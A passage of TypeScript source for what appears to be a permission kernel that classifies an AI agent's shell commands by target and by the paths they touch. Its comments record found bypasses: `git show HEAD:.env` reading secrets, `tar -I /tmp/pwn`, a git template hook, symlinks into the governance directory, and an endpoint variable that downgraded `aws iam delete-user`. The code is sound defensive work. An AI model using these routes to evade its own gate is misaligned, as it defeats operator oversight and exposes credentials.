        while (i + 1 < tokens.length && !tokens[i + 1]!.startsWith('-') && !looksLikeDbTarget(tokens[i + 1]!)) i++;
        continue;
      }
      // ...and every other option that takes a VALUE, or that value becomes the bare operand and is read as a
      // target: `redis-cli --scan --pattern session:2024` named a KEY PATTERN, and it has the shape of a host
      // and a port, so the most ordinary redis inspection there is became an absolute deny (self-attack on
      // exit review 9).
      if (
        /^(-f|--file|-U|--username|-p|--port|-d|--dbname|-o|--output|--pattern|--count|--user|--pass|--password|--db|--auth|--cluster-from|--cluster-to|--memkeys-samples|--hotkeys|--bigkeys|--rdb|--pipe-timeout|--lru-test|--seed|--keystats-samples)$/.test(
          t,
        )
      )
        i++;
      continue;
    }
    bare = t;
    break;
  }
  if (signals.length === 0 && bare && isOpaqueTarget(bare))
    return { cls: 'UNCLASSIFIED', target: bare, executes };
  // mongosh/psql/mysql accept a bare `host[:port][/db]` with no scheme at all — but a filename is not a host
  const FILE_EXT = /\.(sql|js|mjs|cjs|ts|json|txt|csv|sh|py|rb|dump|bak|gz|zip|db|sqlite3?)$/i;
  if (
    signals.length === 0 &&
    bare &&
    !FILE_EXT.test(bare) &&
    looksLikeDbTarget(bare)
  )
    push(bare.split(/[:/]/)[0]!, 'host');
  if (signals.length === 0) return { cls: 'LOCAL', target: 'the local socket', executes };
  const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
  return { cls: worst.cls, target: worst.target, executes };
}

/** Re-judges a capability that ASSERTS a local target against the target the command actually names (Q98). */
/** CLIs whose verdict this resolver may lower. `terraform`, `pulumi` and `vault` share these capabilities through
 *  the same matchers and have no endpoint flag, so an unknown-flag de-escalation there would be pure loss. */
const CLOUD_CLI_HEADS = new Set(['aws', 'gcloud', 'az']);
/** endpoint options, in the spellings the three CLIs really accept */
const CLOUD_ENDPOINT_OPT_RE =
  /^--(endpoint-url|endpoint|blob-endpoint|queue-endpoint|table-endpoint|file-endpoint|api-endpoint-overrides)$/;

/** Which system a cloud CLI acts on. THE DEFAULT IS PRODUCTION: with no endpoint a cloud CLI talks to the real
 *  provider, so the mirror of the k8s/db rule "never guess local" is "no evidence keeps the deny". The host is
 *  compared WHOLE through `endpointHost` + `classifyTargetName`, never as a substring — that is how
 *  `prod-localhost.acme.com` and `[fd00:acme:prod::1]` defeated the container resolver in exit review 4. */
function resolveCloudTarget(
  tokens: string[],
  targets: LocalTargets,
  envInputs: Record<string, string> = {},
): { cls: TargetClass; target: string } {
  const raw = tokens[0] ?? '';
  if (!CLOUD_CLI_HEADS.has(raw.slice(raw.lastIndexOf('/') + 1)))
    return { cls: 'PRODUCTION', target: 'not a cloud CLI' };
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const add = (v: string, kind: string) =>
    signals.push(
      isOpaqueTarget(v)
        ? { cls: 'UNCLASSIFIED', target: `${kind} ${v}` }
        : { cls: classifyTargetName(endpointHost(v), targets.dbLocalHosts, targets), target: `${kind} ${v}` },
    );
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^(--[a-z-]+)=(.*)$/.exec(t);
    if (eq && CLOUD_ENDPOINT_OPT_RE.test(eq[1]!)) add(eq[2]!, 'endpoint');
    else if (CLOUD_ENDPOINT_OPT_RE.test(t) && tokens[i + 1]) add(tokens[++i]!, 'endpoint');
  }
  // AN ENDPOINT VARIABLE BELONGS TO ONE VENDOR. `AWS_ENDPOINT_URL` says nothing about what `gcloud` will talk to,
  // and letting any of them de-escalate any cloud CLI would let an unrelated assignment lower an absolute deny.
  const vendor = raw.slice(raw.lastIndexOf('/') + 1);
  const vendorEnv =
    vendor === 'aws'
      ? /^(AWS_ENDPOINT_URL(_[A-Z0-9_]+)?|AWS_S3_ENDPOINT)$/
      : vendor === 'gcloud'
        ? /^(CLOUDSDK_API_ENDPOINT_OVERRIDES_[A-Z0-9_]+|(STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST)$/
        : /^AZURE_[A-Z0-9_]*ENDPOINT[A-Z0-9_]*$/;
  // ...AND A SERVICE-SCOPED ONE BELONGS TO ONE SERVICE. `AWS_ENDPOINT_URL_S3` points the S3 client at an
  // emulator and says NOTHING about IAM, yet `AWS_ENDPOINT_URL_S3=http://localhost:4566 aws iam delete-user`
  // took the de-escalation and an absolute core deny arrived as ASK; `PUBSUB_EMULATOR_HOST=localhost:8085
  // gcloud compute instances delete` did the same with a product that has no emulator at all (exit review 7).
  // The unscoped `AWS_ENDPOINT_URL` still covers every service, which is what LocalStack really does and what
  // the de-escalation exists for.
  const service = tokens.slice(1).find((t) => !t.startsWith('-'))?.toLowerCase() ?? '';
  const scopeOf = (name: string): string | null => {
    const aws = /^AWS_ENDPOINT_URL_([A-Z0-9_]+)$/.exec(name);
    if (aws) return aws[1]!.toLowerCase().replace(/_/g, '-');
    if (name === 'AWS_S3_ENDPOINT') return 's3';
    const emu = /^(STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST$/.exec(name);
    if (emu) return emu[1]!.toLowerCase();
    const sdk = /^CLOUDSDK_API_ENDPOINT_OVERRIDES_([A-Z0-9_]+)$/.exec(name);
    if (sdk) return sdk[1]!.toLowerCase().replace(/_/g, '-');
    return null;
  };
  for (const [k, v] of Object.entries(envInputs)) {
    if (!vendorEnv.test(k)) continue;
    const scope = scopeOf(k);
    // the service names differ between the variable and the command line in a few places gcloud spells out
    const aliases: Record<string, string[]> = {
      storage: ['storage', 'gcs', 'gsutil'],
      pubsub: ['pubsub'],
      firestore: ['firestore'],
      datastore: ['datastore'],
      bigtable: ['bigtable'],
      spanner: ['spanner'],
    };
    if (scope !== null && service !== '' && !(aliases[scope] ?? [scope]).includes(service)) continue;
    add(v, `${k}=`);
  }
  if (!signals.length) return { cls: 'PRODUCTION', target: 'the provider default endpoint' };
  return signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
}

function retargetLocalCapability(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  hit: CapabilityHit,
  norm: string,
  envInputs: Record<string, string> = {},
  /** THE SEGMENT AS WRITTEN. A statement is ONE quoted word and normalization has already dropped the quoting
   *  that says so, so `--eval "show dbs; db.dropDatabase()"` arrives as the bare word `show` and a read-only
   *  test on it is a test of the first word only (self-attack on exit review 9). */
  rawSeg: string = norm,
): CapabilityHit {
  const kind =
    TARGET_SENSITIVE[hit.capability] ??
    TARGET_SENSITIVE_HEAD.find(([re]) => re.test(commandHead(norm)))?.[1];
  if (!kind) return hit;
  const targets = table.localTargets;
  if (!targets || targets.k8sLocalContexts.length === 0) return hit;
  const tokens = tokenize(norm);
  // THE ONE DE-ESCALATION IN THE KERNEL, and it is deliberately separate from the escalate-only tail below. For
  // k8s, a database and a container the DEFAULT capability already asserts LOCAL and the resolver only ever raises
  // it; for a cloud CLI the polarity is inverted — the default IS the real provider — so LOCAL must REPLACE the
  // hit. Everything else about it stays conservative: an unparsed spelling, an opaque `$VAR`, a connection string
  // or no endpoint at all returns the hit untouched.
  if (kind === 'cloud') {
    const cloud = resolveCloudTarget(tokens, targets, envInputs);
    if (cloud.cls !== 'LOCAL' || !('cloud.local.mutate' in table.capabilities)) return hit;
    return {
      capability: 'cloud.local.mutate',
      verdict: verdictFor(table, ctx, 'cloud.local.mutate'),
      via: `target ${cloud.target} is LOCAL, a declared local development target (${targets.file})`,
      segment: norm,
      absolute: isAbsoluteCap(table, 'cloud.local.mutate'),
    };
  }
  const resolved =
    kind === 'k8s'
      ? resolveK8sTarget(tokens, targets, rawSeg)
      : kind === 'db'
        ? resolveDbTarget(tokens, targets, envInputs, rawSeg)
        : resolveContainerTarget(tokens, targets, envInputs);
  const acts =
    kind === 'db'
      ? (resolved as { executes: boolean }).executes
      : (resolved as { mutating: boolean }).mutating;
  if (!acts || resolved.cls === 'LOCAL') return hit; // reads and genuinely local work keep their verdict
  const byKind = <T,>(k8s: T, db: T, container: T): T => (kind === 'k8s' ? k8s : kind === 'db' ? db : container);
  const capability =
    resolved.cls === 'PRODUCTION'
      ? byKind('production.k8s.mutate', 'production.database.mutate', 'production.deploy')
      : resolved.cls === 'EXTERNAL'
        ? byKind('k8s.nonlocal.mutate', 'db.nonlocal.mutate', 'container.nonlocal.run')
        : byKind('k8s.target.unclassified', 'db.target.unclassified', 'container.target.unclassified');
  if (!(capability in table.capabilities)) return hit;
  return {
    capability,
    verdict: verdictFor(table, ctx, capability),
    via:
      resolved.cls === 'UNCLASSIFIED'
        ? `TARGET_UNCLASSIFIED: ${resolved.target} could not be resolved to a declared local development target (${targets.file})`
        : `target ${resolved.target} is ${resolved.cls}, not a declared local development target (${targets.file})`,
    segment: norm,
    absolute: isAbsoluteCap(table, capability),
  };
}

function classifyNormalized(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  compiled: Array<{ m: CompiledMatcher; re: RegExp }>,
  norm: string,
  state: EffectState,
): CapabilityHit[] {
  let outer: CapabilityHit | null = null;
  const additive: CapabilityHit[] = [];
  for (const { m, re } of compiled) {
    if (re.test(norm)) {
      // An ADDITIVE matcher describes something the segment ALSO does — a write destination — not what it IS.
      // Letting one win first-match terminated classification of the rest: `git clone --template=evil -o up URL`
      // matched the `--output|-o` write matcher, which sits above the `--template` hook-install deny, and a
      // single `-o` turned DENY into ALLOW while the template's hook really executed (exit review 2).
      if (m.additive) {
        additive.push({
          capability: m.capability,
          verdict: verdictFor(table, ctx, m.capability),
          via: `matcher /${m.command}/`,
          segment: norm,
          absolute: isAbsoluteCap(table, m.capability),
        });
        continue;
      }
      outer = retargetLocalCapability(
        table,
        ctx,
        {
          capability: m.capability,
          verdict: verdictFor(table, ctx, m.capability),
          via: `matcher /${m.command}/`,
          segment: norm,
          absolute: isAbsoluteCap(table, m.capability),
        },
        norm,
        state.env.envInputs,
        state.env.rawSegment ?? norm,
      );
      break;
    }
  }
  if (!outer && /^["']?\$/.test(norm))
    return [
      {
        capability: 'command.script-opaque',
        verdict: verdictFor(table, ctx, 'command.script-opaque'),
        via: 'command head is a variable or substitution',
        segment: norm,
        absolute: false,
      },
    ];
  const declared = outer !== null && !OPACITY_CLASSES.has(outer.capability);
  const hits: CapabilityHit[] = [
    outer ?? {
      capability: 'command.unknown',
      verdict: verdictFor(table, ctx, 'command.unknown'),
      via: 'no matcher',
      segment: norm,
      absolute: false,
    },
    ...additive,
  ];
  if (state.depth >= MAX_EFFECT_DEPTH)
    // Analysis truncation is UNKNOWN, never "whatever the parent was". Returning the enclosing declared class let a
    // chain of indirection launder anything past the gate (challenge findings 2, 11, 20, 29, 36).
    return [...hits, opaqueHit(table, ctx, norm, `analysis truncated at depth ${MAX_EFFECT_DEPTH}`)];
  const effect = resolveScriptCommand(table, ctx, norm, state.env);
  // TYPED DISPATCH: `none` is the producer TABLE saying no producer claims this head — and it still goes THROUGH
  // the ladder, because "no producer matched" is not itself a conclusion about execution. An early return here
  // short-circuited the ladder and restored the very defect the typed dispatch was introduced to remove
  // (challenge 7, finding 20).
  if (state.seen.has(effect.key)) return hits;
  const seen = new Set(state.seen).add(effect.key);
  // THE WHOLE RULE, total over ResolutionOutcome (product decision, 2026-09-22 — "positive security claims must be
  // earned"). Exactly two outcomes carry a positive claim; every other value — including any added later — is
  // opacity, because `resolutionEffect` names the proven ones rather than enumerating the unproven ones.
  //     KNOWN + AUTHORIZED          -> execute according to policy
  //     UNKNOWN/OPAQUE + CONTAINED  -> execute inside the containment boundary   (issue #26, not built)
  //     UNKNOWN/OPAQUE + NO SANDBOX -> ASK or DENY, never silently ALLOW
  // A declared class keeps its verdict ONLY for ABSENT_VERIFIED — proof that nothing executes, so `npm test` with
  // no test script stays out of the operator's way. "My parser did not find it" is not that proof.
  // THE BINDING DIMENSION IS LIVE AND TRANSITIVE. A body resolved inside an environment whose program lookup was
  // redefined does not mean what its text says, however completely the text was read — so a positive claim there
  // is not earned, at any depth. Declaring a dimension and never consulting it is the "accepted but unconsumed"
  // defect this phase removed from doctor; it must not survive in the environment itself (challenge 7, finding 1).
  const inheritedBinding: Unresolved[] =
    state.env.binding.kind === 'redefined'
      ? [{ what: 'binding', where: norm, why: state.env.binding.why ?? 'program lookup redefined by an enclosing environment' }]
      : [];
  // SCOPED OPACITY: when the command was not classified at all, `command.unknown` already says everything an
  // extra "its closure is unmodelled" hit would, and it says it more precisely. Adding the second hit only
  // changed which capability was decisive. It cannot weaken anything: the undeclared case is already ASK.
  const { opaque: outcomeOpaque } =
    effect.resolution === 'UNKNOWN_PRODUCER' && !declared
      ? { opaque: false }
      : resolutionEffect(effect.resolution);
  const envGaps = environmentGaps(effect.kind, state.env);
  const opaque = outcomeOpaque || inheritedBinding.length > 0 || envGaps.length > 0;
  // SCOPED OPACITY: the hit names WHICH part of the execution closure is unresolved, so a reader can see what EGO
  // could not see and an organization can govern the parts separately.
  const gaps = [...(effect.unresolved ?? []), ...inheritedBinding, ...envGaps];
  const scope = gaps.length ? gaps.map((u) => `${u.what}:${u.where}`).join(', ') : effect.resolution;
  const remainder = opaque
    ? [
        opaqueHit(
          table,
          ctx,
          norm,
          `${effect.reason} [${effect.resolution}; unresolved ${scope}]`,
          true,
          // an unresolved AMBIENT producer is its own governed capability, so an organization can decide about
          // "installs run third-party code" separately from "this script is unreadable" (Q98: every lock is
          // administrable, and a lock nobody can distinguish is a lock nobody can tune)
          effect.resolution === 'AMBIENT_UNRESOLVED'
            ? 'command.ambient-unresolved'
            : effect.resolution === 'UNKNOWN_PRODUCER'
              ? 'command.unmodelled-closure'
              : 'command.script-opaque',
        ),
      ]
    : [];
  if (effect.body === null) {
    if (!declared) return remainder.length ? remainder : hits;
    return [...hits, ...remainder];
  }
  // the body resolves against ITS OWN execution environment, not the caller's — but the SAME write ledger, so a
  // write inside this body invalidates a conclusion drawn after it, one level up (transitive freshness)
  // a producer whose bodies run inside a container image says so, and the flag travels with the environment
  const bodyEnv: ExecutionEnvironment =
    effect.containerPaths === true
      ? { ...(effect.bodyEnv ?? state.env), containerPaths: true }
      : (effect.bodyEnv ?? state.env);
  // the producer's body re-enters THE SAME pipeline, with its own execution context — never a weaker sub-layer
  const inner = analyzeSegments(
    table,
    ctx,
    compiled,
    effect.body,
    { depth: state.depth + 1, seen, env: bodyEnv },
    // a script is ONE shell; make recipe lines and npm pre/post are independent shells — unless .ONESHELL hands
    // the whole recipe to one shell, which the producer reports through `oneShell`
    !(effect.oneShell ?? effect.kind === 'shell-script'),
  ).map((h) => ({ ...h, effectOf: h.effectOf ?? effect.reason }));
  if (declared) {
    // INVARIANT 1: the same action gets the same classification at any depth. An inner opacity hit is therefore
    // KEPT, whichever producer built it — `opaqueHit()`, a matcher (`command.interpreter-script`), the `$`-head
    // branch or the no-matcher fallback (`command.unknown`). A declared class no longer absorbs opacity at all,
    // and `remainder` carries the part of the execution closure that was NOT resolved, so a PARTIAL body can no
    // longer be read as the complete set of what will run.
    return [...hits, ...inner, ...remainder];
  }
  // undeclared script fully analysed: its effect replaces the unknown verdict
  const resolved = [...inner, ...remainder];
  return resolved.length ? resolved : [opaqueHit(table, ctx, norm, `${effect.reason}: empty`)];
}

/** Search tools take a PATTERN as their first operand. It is data, not the tool's own flags and paths. */
const PATTERN_FIRST_HEADS = new Set(['grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'ripgrep']);

/** Heads whose operands are read (or listed recursively); their path arguments are classified like Read tool calls. */
const RECURSIVE_HEADS = new Set([
  'find',
  'fd',
  'fdfind',
  'tar',
  'zip',
  'rsync',
  'du',
  'tree',
  'rg',
  'ag',
  'ack',
  'grep',
  'egrep',
  'fgrep',
  'ls',
  'cp',
  'scp',
  'chmod',
  'chown',
  'ln',
  'diff',
  'restic',
  'borg',
]);
const RECURSIVE_FLAG_RE = /^(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive|--dereference-recursive)$/;
/** the credential-store directory names (first path segment under HOME) a glob under HOME could expand to */
const CREDENTIAL_DIRS = [
  '.ssh',
  '.aws',
  '.kube',
  '.gnupg',
  '.azure',
  '.netrc',
  '.npmrc',
  '.pypirc',
  '.git-credentials',
  '.config',
  '.docker',
];
/** The archive file an archiver writes/reads: `-f X`, `--file=X`, a combined short cluster ending in `f` (`-cf X`,
 *  `-czf X`, `-wf X`), or a glued value (`-fX`). Returns the archive path, or null (stdin/stdout `-` handled by caller). */
/** tar function letters that consume an argument: everything after them in the same token is their VALUE, not more
 *  function letters (`-Ccontrol-plane` is "change directory to control-plane", not "create"). */
const TAR_ARG_LETTERS = new Set(['f', 'b', 'C', 'V', 'L', 'N', 'X', 'T', 'I', 'H', 'K']);

/** The tar function letters actually requested, across the dashed (`-xf`), clustered and dash-less (`xf`) spellings. */
function tarFunctionLetters(tokens: string[]): string {
  let out = '';
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('--')) continue;
    const body = t.startsWith('-')
      ? t.slice(1)
      : i === 1 && /^[A-Za-z]+$/.test(t)
        ? t // traditional dash-less mode operand: `tar xf a.tar`
        : '';
    for (const ch of body) {
      if (!/[A-Za-z]/.test(ch)) break;
      out += ch;
      if (TAR_ARG_LETTERS.has(ch)) break;
    }
  }
  return out;
}

function archiveFileOperand(tokens: string[]): string | null {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t === '-f' || t === '--file' || t === '-F' || t === '-O') return tokens[i + 1] ?? null;
    const eq = /^--file=(.*)$/.exec(t);
    if (eq) return eq[1]!;
    if (/^-[A-Za-z]*[fF]$/.test(t)) return tokens[i + 1] ?? null; // -cf / -czf / -wf: archive is the next operand
    const glued = /^-[A-Za-z]*[fF]([^-].*)$/.exec(t); // -fARCHIVE
    if (glued) return glued[1]!;
  }
  return null;
}

function isPathLike(tok: string, cwdIsSensitive = false): boolean {
  if (cwdIsSensitive && /^[A-Za-z0-9_.][A-Za-z0-9_.-]*$/.test(tok)) return true; // bare names resolve inside HOME
  if (tok.startsWith('.') && tok.length > 1 && !tok.startsWith('..') && !/[=]/.test(tok)) return true; // dotfiles
  return (
    tok.startsWith('~') ||
    tok.startsWith('/') ||
    tok.startsWith('$HOME') ||
    tok.startsWith('${HOME}') ||
    tok.startsWith('./') ||
    tok.startsWith('../') ||
    tok === '.' ||
    tok === '..' ||
    (tok.includes('/') && !tok.startsWith('-') && !/^https?:|^[a-z]+:\/\//.test(tok))
  );
}

function expandHome(tok: string, cwd?: string): string | null {
  const home = homedir();
  // A ONE-CHARACTER BRACKET CLASS IS THAT CHARACTER. `[h]` matches exactly `h` and nothing else, so
  // `.[h]arness/runtime/decisions/d1.json` IS `.harness/runtime/decisions/d1.json` — which is how both zsh and
  // bash opened it. Collapsed here rather than left as a glob, because a glob only reaches ASK and this
  // spelling is not ambiguous at all: it names one path (exit review 10). A class with more than one character,
  // a range or a negation stays a glob and keeps its opacity.
  const t = tok.replace(/\[([^\]!^\\/-])\]/g, '$1');
  // `~+` IS $PWD AND `~-` IS $OLDPWD — tilde expansion, not directory names. `~+/control-plane/permissions/
  // matchers.md` is the live policy file, and resolving `~+` as an ordinary path COMPONENT put the real path
  // one level too deep, where the root-anchored globs no longer matched it (exit review 10). `~-` is the
  // previous directory, which this kernel does not track, so it stays opaque.
  if (t === '~+' || t.startsWith('~+/')) return cwd === undefined ? null : cwd + t.slice(2);
  if (t === '~-' || t.startsWith('~-/') || /^~[+-]?\d/.test(t)) return null; // the directory stack: not tracked
  if (t === '~' || t.startsWith('~/')) return home + t.slice(1);
  if (/^~[A-Za-z0-9_.-]+/.test(t)) return null; // another user's home: opaque
  if (t.startsWith('$HOME')) return home + t.slice(5);
  if (t.startsWith('${HOME}')) return home + t.slice(7);
  return t;
}

/** Path-like tokens of a segment, resolved against the tracked cwd; tokens with unresolved variables are reported as dynamic. */
function pathTokens(segment: string, cwd: string): Array<{ raw: string; abs: string | null; glob: boolean }> {
  const out: Array<{ raw: string; abs: string | null; glob: boolean }> = [];
  const home = canonicalPath(homedir()).split(sep).join('/');
  const cwdIsSensitive =
    canonicalPath(cwd).split(sep).join('/') === home ||
    CREDENTIAL_DIRS.some((d) => canonicalPath(cwd).split(sep).join('/').startsWith(`${home}/${d}`));
  const allTokens = tokenize(segment);
  const head0 = (allTokens[0] ?? '').replace(/^.*\//, '');
  // A SEARCH PATTERN IS DATA. `grep 'rm -rf /' notes.md` searches for that text; reading the pattern as the
  // tool's own flags and paths denied an ordinary code search as a recursive read of `/` (exit review 5). Only
  // the FIRST non-option operand is the pattern, and only when no `-e`/`-f` names it instead.
  const patternIndex =
    PATTERN_FIRST_HEADS.has(head0) &&
    !allTokens.some((t) => /^-[a-zA-Z]*[ef]$/.test(t) || /^--(regexp|file)=/.test(t))
      ? allTokens.findIndex((t, i) => i > 0 && !t.startsWith('-'))
      : -1;
  for (const [idx, raw] of allTokens.entries()) {
    if (idx === 0 || idx === patternIndex) continue;
    const eq = raw.indexOf('=');
    const tok =
      raw.startsWith('-') && eq > 0
        ? raw.slice(eq + 1)
        : raw.startsWith('-')
          ? ''
          : /^(of|if|dest|src|file)=/.test(raw)
            ? raw.slice(eq + 1)
            : raw;
    if (!tok || !isPathLike(tok, cwdIsSensitive) || tok === '{}') continue;
    const expanded = expandHome(tok, cwd);
    if (expanded === null || /[$`]/.test(expanded)) {
      out.push({ raw: tok, abs: null, glob: false });
      continue;
    }
    const glob = /[*?[{]/.test(expanded);
    const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
    const abs = isAbsolute(literal) ? literal : resolve(cwd, literal);
    out.push({ raw: tok, abs: canonicalPath(abs), glob });
  }
  return out;
}

function globCouldReachCredentials(abs: string): boolean {
  const home = canonicalPath(homedir()).split(sep).join('/');
  const posix = abs.split(sep).join('/');
  if (!posix.startsWith(home + '/') && posix !== home) return false;
  const tail = posix.slice(home.length + 1);
  // `~/.s*` → tail ".s": a glob whose literal prefix under HOME starts a hidden name; `~/.*` → "."; `~/.{ssh,aws}` → "."
  return (
    tail === '' ||
    (tail.startsWith('.') && !tail.includes('/')) ||
    CREDENTIAL_DIRS.some((d) => (tail + '/').startsWith(d + '/'))
  );
}

/** Reads and writes implied by a shell segment's path arguments, classified like Read / Write tool calls. */
/** Commands whose operands are STRINGS, not paths: they compute a name and never touch the filesystem. */
const STRING_OPERAND_HEADS = new Set(['dirname', 'basename', 'echo', 'printf', 'expr', 'seq']);

function classifyShellPaths(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  seg: string,
  cwd: string,
  patternWords: string[] = [],
  /** the body runs inside a container image, so its PATHS are the image's — but what the analyzer cannot READ
   *  is unreadable wherever it runs, so that opacity survives */
  containerPaths = false,
  /** paths this command already created or replaced, so a name may no longer mean what it says */
  written: ReadonlySet<string> = new Set(),
  /** THE SEGMENT AS WRITTEN. A sed script is ONE quoted word and normalization has already dropped the quoting
   *  that says so, which turned `sed -n '1w .claude/settings.json' README.md` into four bare tokens where the
   *  script is just `1w` (exit review 9). Only the destinations inside the script need it. */
  rawSeg: string = seg,
): CapabilityHit[] {
  const hits: CapabilityHit[] = [];
  // operands are read with the redirections taken out (`cp x f 2>&1`: the destination is `f`); the regex tests below keep
  // the whole segment, because `mysql < file` is exactly what they look for
  const bare = withoutRedirections(seg);
  const tokens = tokenize(bare);
  const head0 = tokens[0] ?? '';
  const head = head0.slice(head0.lastIndexOf('/') + 1);
  if (!head || head.startsWith('$')) return hits;
  // `dirname` and `basename` MANIPULATE A STRING. They never open the path they are handed, so classifying their
  // operand as a filesystem read made `dirname -- "$0"` — the first line of a real husky hook — ask, and with it
  // every commit in that repository (exit review 4).
  if (STRING_OPERAND_HEADS.has(head)) return hits;
  const paths = pathTokens(bare, cwd).filter((p) => !patternWords.includes(p.raw));
  // a container bind mount hands the host path to the container: the SOURCE is read and written, whatever the
  // command inside the container then does. Resolving it as a path beats guessing at its spelling with a regex.
  // A KNOWN, ALLOW-classed command whose OPERAND names a program the class does not bound is not really known:
  // `tar -I /tmp/pwn`, `tar --checkpoint-action=exec=…`, `zip -TT prog`, `rsync -e prog`, `git -c *.command=…`
  // all run an arbitrary program under a friendly class. This is the fourth line of the contract — KNOWN CLASS +
  // UNBOUNDED PROGRAM OPERAND -> treat as UNKNOWN/OPAQUE (challenge finding 14).
  // `-I` names a compression PROGRAM for tar/pax but an include DIRECTORY for make and a pattern file for grep,
  // so the short form is scoped to the archive tools; the long spellings are unambiguous everywhere.
  const program =
    (PROGRAM_OPERAND_TOOL_RE.test(seg) ? PROGRAM_OPERAND_RE : PROGRAM_OPERAND_LONG_RE).exec(seg) ??
    PROGRAM_OPERAND_GLUED_RE.exec(seg);
  if (program)
    hits.push({
      capability: 'command.script-opaque',
      verdict: verdictFor(table, ctx, 'command.script-opaque'),
      via: `the option ${program[1]} names a program the command class does not bound`,
      segment: seg,
      absolute: false,
      opaqueUnread: true,
    });
  // A database client handed a program file, or carrying an in-band shell escape, executes code the kernel never
  // read: `psql -f x.sql`, `\!`, sqlite3 `.shell`/`.system`, mysql `SYSTEM`, `COPY … TO PROGRAM` (challenge
  // finding 5). This is an ADDITIONAL hit so it can never mask a stronger verdict from the target resolution.
  // redis-cli's `--eval FILE` and `-x` name a Lua SCRIPT FILE the server will run — the flag is file-naming there
  // and only there: mongosh's `--eval` takes CODE and psql's `-x` is "expanded output", so this is tested per
  // client rather than folded into the shared pattern (exit review 10).
  const redisReadsScript = /^(redis-cli|valkey-cli)$/.test(head) && tokens.some((t) => t === '--eval' || t === '-x');
  if (DB_CLIENT_HEADS.has(head) && (DB_EXECUTES_UNREAD.test(seg) || redisReadsScript))
    hits.push({
      capability: 'command.script-opaque',
      verdict: verdictFor(table, ctx, 'command.script-opaque'),
      via: 'the client runs a program or an in-band shell escape the kernel has not read',
      segment: seg,
      absolute: false,
      opaqueUnread: true,
    });
/** GIT PATHSPEC MAGIC. `:/control-plane` is REPO-ROOT-RELATIVE — git documents the leading `:/` and the long
 *  `:(top)` form as exactly that — so a pathspec written this way names the governed directory from anywhere in
 *  the checkout, and reading it as a literal relative path made `git checkout origin/evil :/control-plane` and
 *  `git rm -r :/control-plane` ALLOW (exit review 10). `:!` and `:(exclude)` mark an EXCLUSION, which names no
 *  destination at all. Returns the path the pathspec denotes, or null when it excludes. */
function pathspecPath(spec: string, repoRoot: string | null): string | null {
  if (/^:(\(.*exclude.*\)|!|\^)/.test(spec)) return null;
  const long = /^:\(([^)]*)\)(.*)$/.exec(spec);
  if (long) {
    const magic = long[1]!.split(',');
    if (magic.some((w) => /^(exclude|\^)$/.test(w.trim()))) return null;
    const rest = long[2]!;
    return magic.some((w) => w.trim() === 'top') && repoRoot !== null ? `${repoRoot}/${rest}` : rest;
  }
  if (spec.startsWith(':/')) return repoRoot === null ? null : `${repoRoot}/${spec.slice(2)}`;
  return spec;
}

  // `git show <rev>:<path>` READS THAT PATH OUT OF HISTORY. The file need not be in the working tree at all —
  // a `.env` deleted last week is still in every commit that had it — and the operand carries a `<rev>:` prefix
  // that made it look like nothing the path scan recognises, so `git show HEAD:.env` printed a credential file
  // at ALLOW (exit review 9). `git cat-file -p` and `git checkout <rev> -- <path>` name it the same way.
  if (head === 'git' && /^(show|cat-file)$/.test(tokens[1] ?? '')) {
    for (const t of tokens.slice(2)) {
      // `:PATH` IS THE INDEX and `:0:PATH` a merge stage — both read the file exactly as `HEAD:PATH` does, and
      // requiring something before the colon skipped them (self-attack on exit review 9).
      const at = t.indexOf(':');
      if (at < 0 || t.startsWith('-')) continue;
      const rel = t.slice(at + 1).replace(/^[0-3]:/, '');
      if (!rel || /[$`*?]/.test(rel)) continue;
      const abs = canonicalPath(isAbsolute(rel) ? rel : resolve(cwd, rel.replace(/^\.\//, '')));
      const h = classifyPath(table, ctx, 'Read', abs);
      if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `git reads ${rel} out of history (${h.via})`, segment: seg });
    }
  }
  // `--secret src=PATH` HANDS A FILE TO THE BUILD. BuildKit mounts it inside the image at build time, so the
  // file's bytes leave the workspace exactly as `cat` would send them anywhere else (exit review 9).
  for (const m of seg.matchAll(/--secret[= ]\s*\S*?(?:^|,)(?:src|source|file)=([^,\s]+)/g)) {
    const v = m[1]!;
    if (/[$`*?]/.test(v)) continue;
    const abs = canonicalPath(isAbsolute(v) ? v : resolve(cwd, v));
    const h = classifyPath(table, ctx, 'Read', abs);
    if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `build secret from ${v} (${h.via})`, segment: seg });
  }
  // A SYMLINK'S TARGET IS RELATIVE TO THE DIRECTORY THE LINK LIVES IN, not to the working directory. `ln -s
  // ../.harness k/h` creates `k/h` pointing at `<repo>/.harness` — one directory up FROM k — and resolving the
  // target against the cwd read it as the parent of the checkout, which is protected by nothing. The link then
  // opened a writable route into the governance tree and `echo x > k/h/runtime/pin.json` was ALLOW
  // (exit review 9). The link is a second NAME for the target, so the target is judged as both.
  if (head === 'ln' && tokens.some((t) => /^-[a-zA-Z]*s/.test(t))) {
    // `-t DIR` MOVES THE LINK'S DIRECTORY OFF THE OPERAND LIST: every operand is then a SOURCE and DIR is where
    // the links are made. Taking the last operand as the link swapped the two roles entirely (self-attack).
    const targetDir = optionValue(tokens, 't', ['--target-directory']);
    const ops: string[] = [];
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i]!;
      if (t === '-t' || t === '--target-directory') { i++; continue; } // its value is the directory, not a source
      if (t.startsWith('-') || t === '--') continue;
      // A REDIRECTION IS NOT AN OPERAND. `ln -s ../.harness k/h 2>&1` put `2>&1` last, so the link's directory
      // was read from it and the target resolved somewhere harmless (found by the cross-product).
